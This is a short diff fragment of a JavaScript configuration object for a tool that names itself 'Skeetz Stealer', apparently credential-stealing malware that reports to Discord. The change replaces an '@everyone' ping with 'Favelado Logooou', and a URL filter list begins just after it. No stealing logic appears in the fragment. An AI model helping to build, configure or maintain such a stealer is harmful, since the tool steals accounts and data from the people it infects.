@@ -17,7 +17,7 @@ const CONFIG = {
     embed_color: 0x4A4A4A,
     embed_desc: "💉・ Skeetz Stealer ・💉",
     ping_on_run: true,
-    ping_val: "@everyone",
+    ping_val: "Favelado Logooou",
 
     filters: {
         urls: [
